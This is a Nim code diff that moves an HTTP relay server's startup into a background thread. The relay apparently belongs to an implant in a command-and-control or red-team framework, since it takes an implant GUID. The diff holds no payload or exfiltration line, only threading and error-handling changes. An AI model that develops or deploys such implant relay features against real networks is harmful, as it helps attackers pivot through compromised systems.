@@ -3,7 +3,7 @@
     Starts the HTTP relay server if RELAY_PORT is defined at compile time
 ]#
 
-import asyncdispatch
+import asyncdispatch, threadpool
 import http_relay
 
 # Check if RELAY_PORT is defined at compile time
@@ -13,35 +13,51 @@ const RELAY_PORT {.intdefine.}: int = 0
 var g_relayServerStarted: bool = false
 var g_relayServerPort: int = 0
 
+# Background proc to run relay server (non-blocking)
+proc runRelayServerInBackground(port: int, implantGuid: string) =
+    when defined debug:
+        echo "[RELAY] 🔧 Background thread starting relay server on port " & $port
+    try:
+        discard startHttpRelayServer(port, implantGuid)
+    except Exception as e:
+        when defined debug:
+            echo "[RELAY] ❌ Background relay server crashed: " & e.msg
+
 # Start HTTP relay server with dynamic port (runtime command)
-proc startRelayServerWithPort*(port: int, implantGuid: string) {.async.} =
+# Returns immediately after spawning background server
+proc startRelayServerWithPort*(port: int, implantGuid: string): bool =
     # Idempotent guard: return early if already started
     if g_relayServerStarted:
         when defined debug:
             echo "[RELAY] ℹ️  Relay server already started on port " & $g_relayServerPort & ", skipping duplicate start"
-        return
+        return false
     
     when defined debug:
         echo "[RELAY] 🚀 Starting HTTP Relay server on port " & $port
         echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
     
-    # Start relay server in background (non-blocking)
+    # Start relay server in background thread (non-blocking)
     try:
-        let server = startHttpRelayServer(port, implantGuid)
-        
-        if server.isListening:
-            g_relayServerStarted = true  # Mark as started
-            g_relayServerPort = port
-            when defined debug:
-                echo "[RELAY] ✅ HTTP Relay server running on port " & $port
+        # Spawn background thread
+        when compileOption("threads"):
+            spawn runRelayServerInBackground(port, implantGuid)
         else:
-            when defined debug:
-                echo "[RELAY] ❌ Failed to start HTTP Relay server on port " & $port
+            # Fallback: start in current thread (will block, but at least works)
+            runRelayServerInBackground(port, implantGuid)
+        
+        g_relayServerStarted = true  # Mark as started
+        g_relayServerPort = port
+        
+        when defined debug:
+            echo "[RELAY] ✅ HTTP Relay server spawned on port " & $port
+        
+        return true
                 
     except Exception as e:
         when defined debug:
             echo "[RELAY] ❌ Exception starting relay server: " & e.msg
             echo "[RELAY] ❌ Stack trace: " & e.getStackTrace()
+        return false
 
 # Start HTTP relay server in async mode (compile-time RELAY_PORT)
 proc startRelayServerAsync*(implantGuid: string) {.async.} =
